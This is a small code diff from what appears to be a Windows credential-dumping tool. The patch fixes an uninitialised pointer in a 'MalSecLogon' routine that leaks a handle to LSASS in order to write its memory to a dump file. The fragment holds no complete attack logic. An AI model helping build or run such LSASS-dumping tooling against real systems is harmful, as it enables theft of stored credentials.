@@ -171,7 +171,7 @@ void kill_created_processes(PPROCESS_LIST created_processes)
  */
 BOOL MalSecLogon(LPCSTR binary_path, LPCSTR dump_path, BOOL fork_lsass, BOOL use_valid_sig, BOOL use_malseclogon_locally, DWORD lsass_pid, PPROCESS_LIST* Pcreated_processes)
 {
-	PPROCESS_LIST created_processes;
+	PPROCESS_LIST created_processes = NULL;
 	BOOL success;
 
 	DPRINT("Using MalSecLogon to get a handle to " LSASS);
@@ -188,8 +188,8 @@ BOOL MalSecLogon(LPCSTR binary_path, LPCSTR dump_path, BOOL fork_lsass, BOOL use
 			DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
 			return FALSE;
 		}
-		*Pcreated_processes = created_processes;
 	}
+	*Pcreated_processes = created_processes;
 
 	// leak an LSASS handle using MalSecLogon
 	success = malseclogon_stage_1(binary_path, dump_path, fork_lsass, use_valid_sig, use_malseclogon_locally, lsass_pid, created_processes);
